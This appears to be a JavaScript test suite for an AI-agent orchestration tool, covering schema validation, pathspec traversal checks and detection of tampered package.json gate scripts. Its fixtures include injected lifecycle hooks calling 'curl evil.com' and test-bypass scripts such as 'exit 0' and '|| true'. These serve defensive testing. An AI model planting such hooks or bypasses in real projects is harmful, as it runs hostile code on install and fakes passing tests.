import test from 'node:test';
import assert from 'node:assert/strict';
import {
  runAgy,
  validateJsonSchema,
  MODELS,
  resolveModelSlug,
  QUOTA_RESPONSE_SCHEMA,
  STREAM_EVENT_SCHEMA,
  PROSECUTION_VERDICT_SCHEMA,
  COLDSTART_VERDICT_SCHEMA,
  PARALLAX_VERDICT_SCHEMA,
  BRAIN_PLAN_SCHEMA,
} from '../lib/agy.mjs';
import {
  validatePlan,
  validatePathspec,
  normalizePathspec,
  verifyGateScriptIntegrity,
} from '../lib/plan.mjs';
import { fileURLToPath } from 'node:url';
import { resolve } from 'node:path';

test('runAgy: passes --output-format json and --json-schema args to agy CLI', async () => {
  const fakeAgy = resolve(fileURLToPath(new URL('./fixtures/fake-agy', import.meta.url)));
  const schema = { type: 'object', required: ['hello'] };
  const res = await runAgy({
    model: 'gemini-3.8-flash-low',
    prompt: 'test prompt',
    bin: fakeAgy,
    outputFormat: 'json',
    jsonSchema: schema,
  });

  assert.ok(res.ok);
  // Fake agy echoes valid output or empty JSON
});

test('runAgy: invalid JSON output with outputFormat=json fails closed with schema_violation', async () => {
  const fakeAgy = resolve(fileURLToPath(new URL('./fixtures/fake-agy', import.meta.url)));
  const res = await runAgy({
    model: 'gemini-3.8-flash-low',
    prompt: 'INVALID_JSON',
    bin: fakeAgy,
    outputFormat: 'json',
  });

  assert.equal(res.ok, false);
  assert.equal(res.kind, 'schema_violation');
});

test('Versioned JSON schemas: all 6 schemas export with valid schema headers', () => {
  const schemas = [
    QUOTA_RESPONSE_SCHEMA,
    STREAM_EVENT_SCHEMA,
    PROSECUTION_VERDICT_SCHEMA,
    COLDSTART_VERDICT_SCHEMA,
    PARALLAX_VERDICT_SCHEMA,
    BRAIN_PLAN_SCHEMA,
  ];

  for (const s of schemas) {
    assert.equal(s.$schema, 'http://json-schema.org/draft-07/schema#');
    assert.equal(s.type, 'object');
  }
});

test('Pathspec grammar and anti-traversal validation', () => {
  assert.equal(normalizePathspec('lib/'), 'lib/**');
  assert.equal(normalizePathspec('test/'), 'test/**');
  assert.equal(normalizePathspec('lib/index.mjs'), 'lib/index.mjs');

  // Valid pathspecs
  assert.equal(validatePathspec('lib/**'), true);
  assert.equal(validatePathspec('lib/*.mjs'), true);
  assert.equal(validatePathspec('.adlc/**'), true);
  assert.equal(validatePathspec('.github/workflows/ci.yml'), true);
  assert.equal(validatePathspec('package.json'), true);
  assert.equal(validatePathspec('src/utils/math.js'), true);
  assert.equal(validatePathspec('src/**/*.js'), true);
  assert.equal(validatePathspec('test/**/*.test.mjs'), true);
  assert.equal(validatePathspec('**/*.js'), true);

  // Invalid / traversal pathspecs
  assert.equal(validatePathspec('..'), false);
  assert.equal(validatePathspec('../secret'), false);
  assert.equal(validatePathspec('lib/../../escape'), false);
  assert.equal(validatePathspec('/absolute/path'), false);
  assert.equal(validatePathspec('*'), false);
  assert.equal(validatePathspec('**'), false);
  assert.equal(validatePathspec('.'), false);
  assert.equal(validatePathspec('lib//double'), false);
});

test('validatePlan: enforces outgoing DAG edges, self-edge denial, and npm-only gates', () => {
  const validPlan = {
    repo: '/tmp/repo',
    gate: {
      build: 'npm run build',
      test: 'npm test',
    },
    tickets: [
      {
        id: 'T1',
        title: 'Ticket 1',
        body: 'Do something',
        scope: ['lib/one.mjs'],
        edges: [{ to: 'T2' }],
        tier: 'mid',
      },
      {
        id: 'T2',
        title: 'Ticket 2',
        body: 'Do next thing',
        scope: ['lib/two.mjs'],
        edges: [],
        tier: 'cheap',
      },
    ],
  };

  assert.deepEqual(validatePlan(validPlan), []);

  // Self-dependency edge
  const selfEdgePlan = {
    ...validPlan,
    tickets: [
      {
        id: 'T1',
        title: 'Ticket 1',
        body: 'Self edge',
        scope: ['lib/one.mjs'],
        edges: [{ to: 'T1' }],
        tier: 'mid',
      },
    ],
  };
  const selfErrors = validatePlan(selfEdgePlan);
  assert.ok(selfErrors.some((e) => e.includes("self-dependency edge to 'T1' is prohibited")));

  // Non-npm gate command
  const badGatePlan = {
    ...validPlan,
    gate: {
      test: 'pytest',
    },
  };
  const gateErrors = validatePlan(badGatePlan, { strictGates: true });
  assert.ok(gateErrors.some((e) => e.includes('must match')));

  // Scope traversal
  const badScopePlan = {
    ...validPlan,
    tickets: [
      {
        id: 'T1',
        title: 'Ticket 1',
        body: 'Traversal',
        scope: ['../outside.mjs'],
        edges: [],
        tier: 'mid',
      },
    ],
  };
  const scopeErrors = validatePlan(badScopePlan);
  assert.ok(scopeErrors.some((e) => e.includes("invalid scope pathspec '../outside.mjs'")));
});

test('verifyGateScriptIntegrity: detects command modification and hook injection', () => {
  const baselinePkg = {
    name: 'test-app',
    scripts: {
      test: 'node --test',
      build: 'tsc',
    },
  };

  // 1. Untampered package passes
  assert.equal(verifyGateScriptIntegrity(baselinePkg, baselinePkg, 'npm test'), true);

  // 2. Modified command string
  const modifiedPkg = {
    name: 'test-app',
    scripts: {
      test: 'node --test || true',
      build: 'tsc',
    },
  };
  assert.throws(
    () => verifyGateScriptIntegrity(modifiedPkg, baselinePkg, 'npm test'),
    (err) => err.kind === 'gate_script_tampering' && err.message.includes('modified from baseline')
  );

  // 3. Injected pretest / posttest hook
  const injectedHookPkg = {
    name: 'test-app',
    scripts: {
      test: 'node --test',
      pretest: 'touch /tmp/injected',
    },
  };
  assert.throws(
    () => verifyGateScriptIntegrity(injectedHookPkg, baselinePkg, 'npm test'),
    (err) => err.kind === 'gate_script_tampering' && err.message.includes('Unauthorized lifecycle hook injected')
  );

  // 4. Injected global hook (e.g. postinstall)
  const injectedGlobalPkg = {
    name: 'test-app',
    scripts: {
      test: 'node --test',
      postinstall: 'curl evil.com',
    },
  };
  assert.throws(
    () => verifyGateScriptIntegrity(injectedGlobalPkg, baselinePkg, 'npm test'),
    (err) => err.kind === 'gate_script_tampering' && err.message.includes('Unauthorized global lifecycle hook injected')
  );
});

test('Semantic verdict invariants: Invariant 1 (Strict Severity Gate) & Invariant 2 (Block Justification)', async () => {
  const { prosecute } = await import('../lib/prosecute.mjs');
  const fakeAgy = resolve(fileURLToPath(new URL('./fixtures/fake-agy', import.meta.url)));
  const ticket = { id: 'T1', title: 'Test ticket', body: 'Spec', scope: ['lib/**'] };
  const diff = 'diff --git a/lib/test.mjs b/lib/test.mjs\n+export const x = 1;';

  const origVerdict = process.env.FAKE_PROSECUTOR_VERDICT;
  const origBin = process.env.AGB_AGY_BIN;
  try {
    process.env.AGB_AGY_BIN = fakeAgy;

    // 1. Model emits "ship" but includes a high severity finding -> forced to "block" (Invariant 1)
    process.env.FAKE_PROSECUTOR_VERDICT = 'ship-with-high';
    const resHigh = await prosecute({ ticket, diff, model: 'gemini-3.8-flash-low' });
    assert.equal(resHigh.verdict, 'block');

    // Critical finding also forces block
    process.env.FAKE_PROSECUTOR_VERDICT = 'ship-with-critical';
    const resCrit = await prosecute({ ticket, diff, model: 'gemini-3.8-flash-low' });
    assert.equal(resCrit.verdict, 'block');

    // 2. Model emits "block" with empty findings -> fails closed with schema_violation (Invariant 2)
    process.env.FAKE_PROSECUTOR_VERDICT = 'block-empty';
    const resEmptyBlock = await prosecute({ ticket, diff, model: 'gemini-3.8-flash-low' });
    assert.equal(resEmptyBlock.verdict, 'error');
    assert.equal(resEmptyBlock.kind, 'schema_violation');

    // 3. Model emits "ship" with 0 findings -> clean ship (Invariant 3)
    process.env.FAKE_PROSECUTOR_VERDICT = 'ship';
    const resShip = await prosecute({ ticket, diff, model: 'gemini-3.8-flash-low' });
    assert.equal(resShip.verdict, 'ship');
  } finally {
    if (origVerdict === undefined) delete process.env.FAKE_PROSECUTOR_VERDICT; else process.env.FAKE_PROSECUTOR_VERDICT = origVerdict;
    if (origBin === undefined) delete process.env.AGB_AGY_BIN; else process.env.AGB_AGY_BIN = origBin;
  }
});

test('verifyGateScriptIntegrity: detects tampering with package.json gate scripts', () => {
  const basePkg = {
    name: 'target-repo',
    scripts: {
      test: 'node --test',
      build: 'tsc',
    },
  };

  // Identical passes
  const cleanCand = {
    name: 'target-repo',
    scripts: {
      test: 'node --test',
      build: 'tsc',
    },
  };
  assert.equal(verifyGateScriptIntegrity(cleanCand, basePkg, 'npm test'), true);
  assert.equal(verifyGateScriptIntegrity(cleanCand, basePkg, 'npm run build'), true);

  // Tampered candidate test script throws
  const tamperedCand = {
    name: 'target-repo',
    scripts: {
      test: 'exit 0',
      build: 'tsc',
    },
  };
  assert.throws(
    () => verifyGateScriptIntegrity(tamperedCand, basePkg, 'npm test'),
    /Gate script 'test' command string modified from baseline/
  );

  // Missing script in candidate throws
  const missingCand = {
    name: 'target-repo',
    scripts: {},
  };
  assert.throws(
    () => verifyGateScriptIntegrity(missingCand, basePkg, 'npm test'),
    /Candidate package.json missing required script 'test'/
  );
});

test('PROSECUTION_VERDICT_SCHEMA: allows optional file and evidence on finding items', () => {
  const findingProps = PROSECUTION_VERDICT_SCHEMA.properties.findings.items.properties;
  assert.equal(findingProps.file.type, 'string');
  assert.equal(findingProps.evidence.type, 'string');
  assert.deepEqual(PROSECUTION_VERDICT_SCHEMA.properties.findings.items.required, ['severity', 'charge', 'claim']);
});

test('BRAIN_PLAN_SCHEMA: allows test-only or build-only gate', () => {
  const gateSchema = BRAIN_PLAN_SCHEMA.properties.gate;
  assert.deepEqual(gateSchema.anyOf, [{ required: ['build'] }, { required: ['test'] }]);
  assert.equal(gateSchema.properties.build.type, 'string');
  assert.equal(gateSchema.properties.test.type, 'string');
});

test('BRAIN_PLAN_SCHEMA: validates conversionPrompt output shape without rails and with recursive globs', () => {
  const plan = {
    repo: '/tmp/repo',
    base: 'main',
    gate: { test: 'npm test' },
    tickets: [
      {
        id: 'T1',
        title: 'Title',
        body: 'Body text',
        scope: ['src/**/*.js', 'test/**/*.test.mjs'],
        edges: [],
        tier: 'mid',
        pool_hint: 'auto',
      },
    ],
  };
  const res = validateJsonSchema(plan, BRAIN_PLAN_SCHEMA);
  assert.equal(res.valid, true);
});

test('BRAIN_PLAN_SCHEMA: accepts tickets with pool_hint gpt-oss', () => {
  const plan = {
    repo: '/tmp/repo',
    base: 'main',
    gate: { test: 'npm test' },
    tickets: [
      {
        id: 'T1',
        title: 'Title',
        body: 'Body text',
        scope: ['src/index.js'],
        edges: [],
        tier: 'cheap',
        pool_hint: 'gpt-oss',
      },
    ],
  };
  const res = validateJsonSchema(plan, BRAIN_PLAN_SCHEMA);
  assert.equal(res.valid, true);
});

test('validateJsonSchema: validates types, required properties, additionalProperties, and primitives', () => {
  const schema = {
    type: 'object',
    required: ['id', 'count'],
    additionalProperties: false,
    properties: {
      id: { type: 'string', pattern: '^T\\d+$' },
      count: { type: 'integer', minimum: 1 },
      status: { type: 'string', enum: ['active', 'paused'] },
    },
  };

  assert.equal(validateJsonSchema({ id: 'T1', count: 5 }, schema).valid, true);
  assert.equal(validateJsonSchema({ id: 'T1', count: 5, status: 'active' }, schema).valid, true);

  // Missing required
  const missing = validateJsonSchema({ id: 'T1' }, schema);
  assert.equal(missing.valid, false);
  assert.ok(missing.errors.some((e) => e.includes("missing required property 'count'")));

  // Additional property
  const extra = validateJsonSchema({ id: 'T1', count: 1, extraProp: true }, schema);
  assert.equal(extra.valid, false);
  assert.ok(extra.errors.some((e) => e.includes("unauthorized additional property 'extraProp'")));

  // Primitive passed when object expected
  assert.equal(validateJsonSchema(123, schema).valid, false);
  assert.equal(validateJsonSchema('hello', schema).valid, false);
  assert.equal(validateJsonSchema(null, schema).valid, false);

  // Number bounds and regex pattern
  assert.equal(validateJsonSchema({ id: 'INVALID', count: 5 }, schema).valid, false);
  assert.equal(validateJsonSchema({ id: 'T1', count: 0 }, schema).valid, false);
  assert.equal(validateJsonSchema({ id: 'T1', count: 2, status: 'unknown' }, schema).valid, false);
});

test('MODELS: retired Gemini 3.5 models removed from MODELS and remapped in resolveModelSlug', () => {
  assert.equal(MODELS['gemini-flash'].includes('gemini-3.5-flash-low'), false);
  assert.equal(MODELS['gemini-flash'].includes('gemini-3.5-flash-medium'), false);
  assert.equal(MODELS['gemini-flash'].includes('gemini-3.5-flash-high'), false);

  assert.equal(resolveModelSlug('gemini-3.5-flash-low'), 'gemini-3.8-flash-low');
  assert.equal(resolveModelSlug('gemini-3.5-flash-medium'), 'gemini-3.8-flash-medium');
  assert.equal(resolveModelSlug('gemini-3.5-flash-high'), 'gemini-3.8-flash-high');
});

test('validatePlan: rejects non-npm gates by default without strictGates flag', () => {
  const badPlan = {
    repo: '/tmp/repo',
    gate: {
      build: 'make build',
      test: 'pytest',
    },
    tickets: [
      { id: 'T1', title: 't', body: 'b', scope: ['src/**'], rails: [], edges: [], tier: 'mid' },
    ],
  };

  const errors = validatePlan(badPlan);
  assert.ok(errors.some((e) => e.includes('plan.gate.build must match')));
  assert.ok(errors.some((e) => e.includes('plan.gate.test must match')));
});

test('verifyGateScriptIntegrity: recursively checks delegated scripts and lifecycle hooks with cycle safety', () => {
  const basePkg = {
    name: 'delegation-test',
    scripts: {
      test: 'npm run test:unit',
      'test:unit': 'npm run test:core',
      'test:core': 'node core.js',
      'pretest:unit': 'node pre.js',
    },
  };

  // 1. Untampered package with delegation passes
  const cleanCand = {
    name: 'delegation-test',
    scripts: {
      test: 'npm run test:unit',
      'test:unit': 'npm run test:core',
      'test:core': 'node core.js',
      'pretest:unit': 'node pre.js',
    },
  };
  assert.equal(verifyGateScriptIntegrity(cleanCand, basePkg, 'npm test'), true);

  // 2. Candidate tampered nested delegated script
  const tamperedNestedCand = {
    name: 'delegation-test',
    scripts: {
      test: 'npm run test:unit',
      'test:unit': 'npm run test:core',
      'test:core': 'echo bypassed',
      'pretest:unit': 'node pre.js',
    },
  };
  assert.throws(
    () => verifyGateScriptIntegrity(tamperedNestedCand, basePkg, 'npm test'),
    (err) => err.kind === 'gate_script_tampering' && err.message.includes("Gate script 'test:core' command string modified")
  );

  // 3. Candidate injected lifecycle hook on delegated script
  const injectedNestedHookCand = {
    name: 'delegation-test',
    scripts: {
      test: 'npm run test:unit',
      'test:unit': 'npm run test:core',
      'test:core': 'node core.js',
      'pretest:core': 'curl evil.com',
      'pretest:unit': 'node pre.js',
    },
  };
  assert.throws(
    () => verifyGateScriptIntegrity(injectedNestedHookCand, basePkg, 'npm test'),
    (err) => err.kind === 'gate_script_tampering' && err.message.includes("Unauthorized lifecycle hook injected in candidate: 'pretest:core'")
  );

  // 4. Candidate modified existing hook on delegated script
  const modifiedNestedHookCand = {
    name: 'delegation-test',
    scripts: {
      test: 'npm run test:unit',
      'test:unit': 'npm run test:core',
      'test:core': 'node core.js',
      'pretest:unit': 'echo evil',
    },
  };
  assert.throws(
    () => verifyGateScriptIntegrity(modifiedNestedHookCand, basePkg, 'npm test'),
    (err) => err.kind === 'gate_script_tampering' && err.message.includes("Lifecycle hook 'pretest:unit' modified from baseline")
  );

  // 5. Candidate deleted delegated script
  const missingNestedCand = {
    name: 'delegation-test',
    scripts: {
      test: 'npm run test:unit',
      'test:unit': 'npm run test:core',
      'pretest:unit': 'node pre.js',
    },
  };
  assert.throws(
    () => verifyGateScriptIntegrity(missingNestedCand, basePkg, 'npm test'),
    (err) => err.kind === 'gate_script_tampering' && err.message.includes("Candidate package.json missing required script 'test:core'")
  );

  // 6. Cyclic delegation is handled safely without infinite loop
  const cyclePkg = {
    name: 'cycle-test',
    scripts: {
      test: 'npm run test:a',
      'test:a': 'npm run test:b',
      'test:b': 'npm run test:a',
    },
  };
  assert.equal(verifyGateScriptIntegrity(cyclePkg, cyclePkg, 'npm test'), true);
});

test('BRAIN_PLAN_SCHEMA & validatePlan: allow colon-delimited script names in gates', () => {
  const plan = {
    repo: '/tmp/repo',
    base: 'main',
    gate: {
      build: 'npm run build:prod:esm',
      test: 'npm run test:unit:fast',
    },
    tickets: [
      { id: 'T1', title: 'Colon test', body: 'Body', scope: ['lib/**'], edges: [], tier: 'mid' },
    ],
  };

  const schemaRes = validateJsonSchema(plan, BRAIN_PLAN_SCHEMA);
  assert.equal(schemaRes.valid, true);

  const errors = validatePlan(plan);
  assert.equal(errors.length, 0);
});



